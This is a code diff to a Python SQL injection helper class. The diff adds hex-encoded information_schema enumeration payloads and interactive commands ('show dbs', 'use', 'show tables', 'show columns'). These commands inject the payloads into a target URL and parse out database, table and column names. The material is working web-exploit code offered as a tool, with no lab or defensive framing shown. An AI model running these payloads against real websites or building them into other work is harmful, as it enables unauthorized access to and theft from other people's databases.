@@ -5,9 +5,12 @@ from .Dios import Dios
 class Sqli:
 
     def __init__(self, url):
-      self.url= url
-      self.dios = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
-      self.show_dbs = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name, 0x3c62723e))))x)"
+      self.url           = url
+      self.dios          = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
+      self.show_dbs      = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)"
+      self.database_name = ""
+      self.show_tables   = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x"
+      self.show_columns  = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME=0x"
 
     def information(self, level=1):
         dios = Dios().get_information()
@@ -88,8 +91,44 @@ class Sqli:
             elif cmd == "show dbs":
                 r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
                 output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
-                print("Database : ")
-                print(output.replace("<br>", "\n"))
+                print("[\033[92m+\033[97m] Database : ")
+                output = output.split("<br>")
+                for db in output:
+                    print(f"└[\033[92m•\033[97m] {db}")
+                self.command_line()
+            elif re.search("use (.*)", cmd):
+                dbname = re.search('use (.*)', cmd).group(1)
+                r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(dbname) + ")")))
+                output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+                if output != None:
+                    self.database_name = dbname
+                    print(f"\n[\033[92m+\033[97m] Database changed to : {dbname}\n")
+                else:
+                    print(f'\n[\033[91m-\033[97m] Unknown Database : {dbname}\n')
+                self.command_line()
+            elif cmd == "show tables":
+                if not self.database_name:
+                    print("\n[\033[91m-\033[97m] No database selected!\n")
+                else:
+                    r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.database_name) + ")")))
+                    output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+                    if output != None:
+                        print(f"[\033[92m+\033[97m] Tables from database {self.database_name} : ")
+                        output = output.group(1).split("<br>")
+                        for table in output:
+                            print(f"└[\033[92m•\033[97m] {table}")
+                    else:
+                        print(f'\n[\033[91m-\033[97m] Cannot show table from database {self.database_name}\n')
+                self.command_line()
+            elif re.search("show columns (.*)", cmd):
+                table = re.search('show columns (.*)', cmd).group(1)
+                r       = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
+                output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+                if output != None:
+                    print(f"[\033[92m+\033[97m] Columns from table {table} : ")
+                    output = output.group(1).split('<br>')
+                    for column in output:
+                        print(f"└[\033[92m•\033[97m] {column}")
                 self.command_line()
             else:
                 r           = requests.get(self.url.replace('*', Dios().build(cmd)))
